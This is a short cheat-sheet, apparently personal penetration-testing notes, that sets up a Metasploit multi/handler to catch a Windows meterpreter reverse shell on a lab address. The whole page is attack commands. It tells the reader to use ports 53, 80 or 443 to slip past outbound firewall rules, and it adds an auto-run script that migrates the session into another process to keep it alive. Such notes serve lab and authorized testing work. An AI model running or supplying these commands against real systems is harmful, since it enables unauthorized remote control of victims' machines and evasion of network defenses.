---
title: "Metasploit Listener"
date: 2024-6-26
tags: ["metasploit", "listener", "revshell", "msfconsole"]
---

---
### Start a Metasploit Listener

<div>

```bash
msfconsole -q
```

```bash
use exploit/multi/handler
```

```bash
set payload windows/meterpreter/reverse_tcp
```

```bash
set lhost 10.10.14.10
```

```bash
set lport 443
```

```bash
run
```

</div>

<small>*Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules*</small>

### If the shell die immediately, we can try to migrate it to another process

<div>

```bash
# Create a automigrate.rc script
run post/windows/manage/migrate
```

</div>

<br>

<div>

```bash
msfconsole -q
```

```bash
use exploit/multi/handler
```

```bash
set payload windows/meterpreter/reverse_tcp
```

```bash
set lhost 10.10.14.10
```

```bash
set lport 443
```

```bash
set AutoRunScript multi_console_command -r automigrate.rc
```

```bash
run
```

</div>

<br>